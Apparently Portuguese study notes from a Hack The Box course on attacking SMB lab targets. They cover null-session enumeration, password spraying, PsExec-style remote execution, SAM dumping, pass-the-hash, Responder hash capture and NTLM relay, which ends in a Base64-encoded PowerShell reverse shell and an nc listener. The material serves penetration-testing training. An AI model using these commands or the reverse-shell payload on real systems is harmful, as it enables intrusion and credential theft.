---
tags:
  - hacking
  - protocolo
  - networking
---
# Atacando SMB

Server Message Block (SMB) é um protocolo de comunicação criado para fornecer acesso compartilhado a arquivos e impressoras entre nós de uma rede. Inicialmente, ele foi projetado para rodar sobre NetBIOS sobre TCP/IP (NBT) usando a porta TCP ``139`` e as portas UDP ``137`` e ``138``. No entanto, com o Windows 2000, a Microsoft adicionou a opção de executar SMB diretamente sobre TCP/IP na porta ``445``. sem a camada NetBIOS extra. Hoje em dia, os sistemas operacionais Windows modernos usam SMB sobre TCP, mas ainda suportam a implementação de NetBIOS como failover.

``Samba`` é uma implementação de código aberto baseada em Unix/Linux do protocolo SMB. Ele também permite que servidores Linux/Unix e clientes Windows usem os mesmos serviços SMB.

Por exemplo, no Windows, o SMB pode ser executado diretamente na porta ``445 TCP/IP`` sem a necessidade de NetBIOS sobre TCP/IP, mas se o Windows tiver o NetBIOS ativado ou se estivermos visando um host não Windows, encontraremos o SMB sendo executado na porta ``139 TCP/IP``. Isso significa que o SMB está sendo executado com NetBIOS sobre TCP/IP.

Outro protocolo comumente relacionado ao SMB é o MSRPC (``Microsoft Remote Procedure Call``). O RPC fornece ao desenvolvedor de aplicativos uma maneira genérica de executar um procedimento (também conhecido como função) em um processo local ou remoto sem precisar entender os protocolos de rede usados para suportar a comunicação, conforme especificado no MS-RPCE, que define um RPC sobre protocolo SMB. que pode usar pipes nomeados do protocolo SMB como seu transporte subjacente.

Para atacar um servidor SMB, precisamos entender sua implementação, sistema operacional e quais ferramentas podemos usar para abusar dele. Tal como acontece com outros serviços, podemos abusar de configurações incorretas ou privilégios excessivos, explorar vulnerabilidades conhecidas ou descobrir novas vulnerabilidades. Além disso, depois de obtermos acesso ao Serviço SMB, se interagirmos com uma pasta compartilhada, precisamos estar cientes do conteúdo do diretório. Finalmente, se tivermos como alvo NetBIOS ou RPC, identifique quais informações podemos obter ou que ação podemos executar no destino.

## Enumerção

Dependendo da implementação do SMB e do sistema operacional, obteremos informações diferentes usando o ``Nmap``. Lembre-se de que, ao direcionar o sistema operacional Windows, as informações de versão geralmente não são incluídas como parte dos resultados da verificação do Nmap. Em vez disso, o Nmap tentará adivinhar a versão do sistema operacional. No entanto, muitas vezes precisaremos de outras verificações para identificar se o alvo está vulnerável a uma exploração específica. Abordaremos a busca por vulnerabilidades conhecidas posteriormente nesta seção. Por enquanto, vamos verificar as portas ``139`` e ``445`` TCP.

```bash
NycolasES6@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

A varredura do Nmap revela informações essenciais sobre o alvo:

- Versão SMB (Samba smbd 4.6.2)
- Nome do host HTB
- O sistema operacional é Linux baseado na implementação SMB

Vamos explorar algumas configurações incorretas comuns e ataques específicos de protocolos.

## Configurações incorretas

O SMB pode ser configurado para não exigir autenticação, que geralmente é chamada de null session. Em vez disso, podemos fazer login em um sistema sem nome de usuário ou senha.

### Autenticação anônima

Se encontrarmos um servidor SMB que não requer nome de usuário e senha ou encontrarmos credenciais válidas, podemos obter uma lista de compartilhamentos, nomes de usuário, grupos, permissões, políticas, serviços, etc. A maioria das ferramentas que interagem com SMB permite conectividade de sessão nula, incluindo ``smbclient``, ``smbmap``, ``rpcclient``, ou ``enum4linux``. Vamos explorar como podemos interagir com compartilhamentos de arquivos e RPC usando autenticação nula.

### Compartilhamento de arquivo

Usando ``smbclient``, podemos exibir uma lista de compartilhamentos do servidor com a opção ``-L``, e usando a opção ``-N``, dizemos para o ``smbclient`` usar a sessão nula.

```bash
NycolasES6@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

``Smbmap`` é outra ferramenta que nos ajuda a enumerar compartilhamentos de rede e acessar as permissões associadas. Uma vantagem do ``smbmap`` é que ele fornece uma lista de permissões para cada pasta compartilhada

```bash
NycolasES6@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Usando o `sbmap` com a opção `-r` ou `-R`(Recursiva), pode-se navegar nos diretórios:

```bash
NycolasES6@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

No exemplo acima, as permissões são definidas como ``READ`` e ``WRITE``, que podem ser usadas para fazer upload e download dos arquivos.

```bash
NycolasES6@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

```bash
NycolasES6@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

### Chamada de Procedimento Remoto (RPC)

Podemos usar a ferramenta ``rpcclient`` com uma sessão nula para enumerar uma estação de trabalho ou controlador de domínio.

A ferramenta ``rpcclient`` nos oferece muitos comandos diferentes para executar funções específicas no servidor SMB para coletar informações ou modificar atributos do servidor, como nome de usuário. Podemos usar esta folha de dicas do SANS Institute ou revisar a lista completa de todas essas funções encontradas na página de manual do arquivo ``rpcclient``.

```bash
NycolasES6@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

``Enum4linux`` é outro utilitário que oferece suporte a sessões nulas e utiliza ``nmblookup``, ``net``, ``rpcclient`` e ``smbclient`` para automatizar algumas enumerações comuns de alvos ``SMB``, como:

- Nome do grupo de trabalho/domínio
- Informações dos usuários
- Informações do sistema operacional
- Informações dos grupos
- Compartilha pastas
- Informações sobre política de senha

A ferramenta original foi escrita em Perl e reescrita por Mark Lowe em Python .

```bash
NycolasES6@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```

## Ataques específicos de protocolo

Se uma sessão nula não estiver habilitada, precisaremos de credenciais para interagir com o protocolo SMB. Duas maneiras comuns de obter credenciais são a força bruta e a pulverização de senhas .

### Força bruto e pulverização de senhas

Na força bruta, tentamos tantas senhas quanto possível em uma conta, mas isso pode bloquear uma conta se atingirmos o limite. Podemos usar a força bruta e parar antes de atingir o limite, se soubermos disso. Caso contrário, não recomendamos o uso de força bruta.

A pulverização de senhas é uma alternativa melhor, pois podemos direcionar uma lista de nomes de usuários com uma senha comum para evitar bloqueios de contas. Podemos tentar mais de uma senha se soubermos o limite de bloqueio da conta. Normalmente, duas a três tentativas são seguras, desde que esperemos 30 a 60 minutos entre as tentativas. Vamos explorar a ferramenta __CrackMapExec__ que inclui a capacidade de executar pulverização de senhas.

Com o CrackMapExec (CME), podemos atingir vários IPs, usando vários usuários e senhas. Vamos explorar um caso de uso diário de pulverização de senhas. Para realizar uma pulverização de senha em um IP, podemos usar a opção ``-u`` para especificar um arquivo com uma lista de usuários e ``-p`` para especificar uma senha. Isso tentará autenticar todos os usuários da lista usando a senha fornecida.

```bash
NycolasES6@htb[/htb]$ cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```

```bash
NycolasES6@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

> Nota: Por padrão, o CME será encerrado após um login bem-sucedido ser encontrado. Usar o sinalizador `--continue-on-success` continuará a pulverização mesmo depois que uma senha válida for encontrada. é muito útil para distribuir uma única senha em uma grande lista de usuários. Além disso, se tivermos como alvo um computador sem domínio, precisaremos usar a opção __--local-auth__. Para um estudo mais detalhado sobre Pulverização de Senhas, consulte o módulo Enumeração e Ataques do Active Directory.

### PME

Os servidores SMB Linux e Windows fornecem diferentes caminhos de ataque. Normalmente, só obteremos acesso ao sistema de arquivos, abusaremos de privilégios ou exploraremos vulnerabilidades conhecidas em um ambiente Linux, como discutiremos mais adiante nesta seção. No entanto, no Windows, a superfície de ataque é mais significativa.

Ao atacar um Windows SMB Server, nossas ações serão limitadas pelos privilégios que tínhamos no usuário que conseguimos comprometer. Se este usuário for Administrador ou possuir privilégios específicos, poderemos realizar operações como:

- Execução Remota de Comando
- Extraia hashes do banco de dados SAM
- Enumerando usuários conectados
- Passe o hash (PTH)

Vamos discutir como podemos realizar tais operações. Além disso, aprenderemos como o protocolo SMB pode ser abusado para recuperar o hash de um usuário como um método para aumentar privilégios ou obter acesso a uma rede.

### Execução Remota de Código (RCE)

Antes de começarmos a executar um comando em um sistema remoto usando SMB, vamos falar sobre Sysinternals. O site Windows Sysinternals foi criado em 1996 por Mark Russinovich e Bryce Cogswell para oferecer recursos técnicos e utilitários para gerenciar, diagnosticar, solucionar problemas e monitorar um ambiente Microsoft Windows. A Microsoft adquiriu o Windows Sysinternals e seus ativos em 18 de julho de 2006.

Sysinternals apresentava várias ferramentas freeware para administrar e monitorar computadores executando Microsoft Windows. O software agora pode ser encontrado no site da Microsoft . Uma dessas ferramentas freeware para administrar sistemas remotos é o PsExec.

PsExec é uma ferramenta que nos permite executar processos em outros sistemas, com total interatividade para aplicativos de console, sem a necessidade de instalar software cliente manualmente. Funciona porque possui uma imagem de serviço do Windows dentro de seu executável. Ele pega esse serviço e o implanta no compartilhamento admin$ (por padrão) na máquina remota. Em seguida, ele usa a interface DCE/RPC sobre SMB para acessar a API do Windows Service Control Manager. Em seguida, inicia o serviço PSExec na máquina remota. O serviço PSExec cria então um pipe nomeado que pode enviar comandos ao sistema.

Podemos baixar o PsExec do site da Microsoft ou podemos usar algumas implementações do Linux:

- Impacket PsExec - Exemplo de funcionalidade semelhante ao Python PsExec usando RemComSvc .
- Impacket SMBExec – Uma abordagem semelhante ao PsExec sem usar RemComSvc . A técnica é descrita aqui. Esta implementação vai um passo além, instanciando um servidor SMB local para receber a saída dos comandos. Isto é útil quando a máquina de destino NÃO possui um compartilhamento gravável disponível.
- Impacket atexec – Este exemplo executa um comando na máquina de destino por meio do serviço Agendador de Tarefas e retorna a saída do comando executado.
- CrackMapExec - inclui uma implementação de smbexece atexec.
- Metasploit PsExec - Implementação Ruby PsExec.

### Impacket PsExec

Para usar o **impacket-psexec**, nós precisamos prover o domínio, a senha e o endereço IP da nossa máquina alvo. Para mais informações detalhadas podemos usar __impacket help:__

```bash
NycolasES6@htb[/htb]$ impacket-psexec -h
```

Para conectar-se a uma máquina remota com uma conta de administrador local, usando ``impacket-psexec``, você pode usar o seguinte comando:

```bash 
NycolasES6@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

As mesmas opções se aplicam a ``impacket-smbexec`` e ``impacket-atexec``.

### CrackMapExec

Outra ferramenta que podemos usar para executar o CMD ou o PowerShell é o ``CrackMapExec``. Uma vantagem do ``CrackMapExec`` é a disponibilidade para executar um comando em vários hosts ao mesmo tempo. Para usá-lo, precisamos especificar o protocolo, ``smbo``, endereço IP ou intervalo de endereços IP, a opção ``-u`` de nome de usuário e ``-p`` de senha e a opção ``-x`` de executar comandos cmd ou letras maiúsculas ``-X`` para executar comandos do PowerShell.

```bash
NycolasES6@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

> Nota: Se ``--exec-method`` não estiver definido, ``CrackMapExec`` tentará executar o método ``atexec``, se falhar você pode tentar especificar o ``--exec-method`` smbexec.

### Enumerando usuários conectados

Imagine que estamos em uma rede com várias máquinas. Alguns deles compartilham a mesma conta de administrador local. Nesse caso, poderíamos usar ``CrackMapExec`` para enumerar usuários logados em todas as máquinas da mesma rede ``10.10.110.17/24``, o que agiliza nosso processo de enumeração.

```bash

NycolasES6@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

### Extraia hashes do banco de dados SAM

O Security Account Manager (SAM) é um arquivo de banco de dados que armazena senhas de usuários. Ele pode ser usado para autenticar usuários locais e remotos. Se obtivermos privilégios administrativos em uma máquina, podemos extrair os hashes do banco de dados SAM para diferentes finalidades:

- Autentique-se como outro usuário.
- Quebra de senha, se conseguirmos quebrar a senha, podemos tentar reutilizá-la para outros serviços ou contas.
- Passe o hash. Discutiremos isso mais tarde nesta seção.

```bash
NycolasES6@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

### Passe o hash (PtH)

Se conseguirmos obter um hash NTLM de um usuário e não conseguirmos quebrá-lo, ainda poderemos usar o hash para autenticar em SMB com uma técnica chamada Pass-the-Hash (PtH). O PtH permite que um invasor se autentique em um servidor ou serviço remoto usando o hash NTLM subjacente da senha de um usuário em vez da senha em texto simples. Podemos usar um ataque PtH com qualquer ferramenta ``Impacket``, ``SMBMap``, ``CrackMapEx`` e coutras ferramentas. Aqui está um exemplo de como isso funcionaria com ``CrackMapExec``:

```bash
NycolasES6@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

### Ataques de autenticação forçada

Também podemos abusar do protocolo SMB criando um servidor SMB falso para capturar hashes NetNTLM v1/v2 dos usuários .

A ferramenta mais comum para realizar tais operações é o ``Responder``. Responder é uma ferramenta envenenadora LLMNR, NBT-NS e MDNS com diferentes capacidades, uma delas é a possibilidade de configurar serviços falsos, incluindo SMB, para roubar hashes NetNTLM v1/v2. Em sua configuração padrão, encontrará tráfego LLMNR e NBT-NS. Em seguida, ele responderá em nome dos servidores que a vítima procura e capturará seus hashes NetNTLM.

Vamos ilustrar um exemplo para entender melhor como ``Responder`` funciona. Imagine que criamos um servidor SMB falso usando a configuração padrão do Responder, com o seguinte comando:

```bash
NycolasES6@htb[/htb]$ responder -I <interface name>
```

Quando um usuário ou sistema tenta executar uma resolução de nomes (NR), uma série de procedimentos é conduzida por uma máquina para recuperar o endereço IP de um host por seu nome de host. Em máquinas Windows, o procedimento será aproximadamente o seguinte:

- O endereço IP do compartilhamento de arquivos do nome do host é obrigatório.
- O arquivo host local (C:\Windows\System32\Drivers\etc\hosts) será verificado em busca de registros adequados.
- Se nenhum registro for encontrado, a máquina muda para o cache DNS local, que mantém registro dos nomes resolvidos recentemente.
- Não há registro DNS local? Uma consulta será enviada ao servidor DNS que foi configurado.
- Se tudo mais falhar, a máquina emitirá uma consulta multicast, solicitando o endereço IP do compartilhamento de arquivos de outras máquinas na rede.

Suponha que um usuário tenha digitado incorretamente o nome de uma pasta compartilhada ``\\mysharefoder\`` em vez de ``\\mysharedfolder\``. Nesse caso, todas as resoluções de nomes falharão porque o nome não existe, e a máquina enviará uma consulta multicast para todos os dispositivos na rede, incluindo nós que executamos nosso servidor SMB falso. Isto é um problema porque nenhuma medida é tomada para verificar a integridade das respostas. Os invasores podem tirar vantagem desse mecanismo ouvindo essas consultas e falsificando as respostas, levando a vítima a acreditar que os servidores maliciosos são confiáveis. Essa confiança geralmente é usada para roubar credenciais.

```bash
NycolasES6@htb[/htb]$ sudo responder -I ens33
```

Essas credenciais capturadas podem ser quebradas usando hashcat ou retransmitidas para um host remoto para completar a autenticação e representar o usuário.

Todos os Hashes salvos estão localizados no diretório de logs do Responder ( /usr/share/responder/logs/). Podemos copiar o hash para um arquivo e tentar quebrá-lo usando o módulo hashcat 5600.

> Observação: se você notar vários hashes para uma conta, isso ocorre porque o NTLMv2 utiliza um desafio do lado do cliente e do lado do servidor que é aleatório para cada interação. Isso faz com que os hashes resultantes enviados sejam salgados com uma sequência aleatória de números. É por isso que os hashes não correspondem, mas ainda representam a mesma senha.

```bash
NycolasES6@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

O hash NTLMv2 foi quebrado. A senha é `P@ssword`. Se não conseguirmos quebrar o hash, podemos potencialmente retransmitir o hash capturado para outra máquina usando [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) ou Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) . Vejamos um exemplo usando `impacket-ntlmrelayx`.

Primeiro, precisamos definir SMB `OFF`em nosso arquivo de configuração do respondedor ( `/etc/responder/Responder.conf`).

```shell
NycolasES6@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Em seguida, executamos `impacket-ntlmrelayx` com a opção `--no-http-server`, `-smb2support` e a máquina de destino com a opção `-t`. Por padrão, `impacket-ntlmrelayx` irá despejar o banco de dados SAM, mas podemos executar comandos adicionando a opção `-c`.

```sh
NycolasES6@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

Podemos criar um shell reverso do PowerShell usando [https://www.revshells.com/](https://www.revshells.com/) , definir o endereço IP da máquina, a porta e a opção Powershell #3 (Base64).

```shell
NycolasES6@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Depois que a vítima se autentica em nosso servidor, envenenamos a resposta e fazemos com que ela execute nosso comando para obter um shell reverso.

```shell
NycolasES6@htb[/htb]$ nc -lvnp 9001
```
 
#### RPC

No [módulo Footprinting](https://academy.hackthebox.com/course/preview/footprinting) , discutimos como enumerar uma máquina usando RPC. Além da enumeração, podemos usar RPC para fazer alterações no sistema, como:

- Alterar a senha de um usuário.
- Crie um novo usuário de domínio.
- Crie uma nova pasta compartilhada.

Também abordamos a enumeração usando RPC no [módulo Enumeração e ataques do Active Directory](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks) .

Lembre-se de que algumas configurações específicas são necessárias para permitir esses tipos de alterações por meio do RPC. Podemos usar a [página man do rpclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) ou [o SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) do SANS Institute para explorar isso ainda mais.








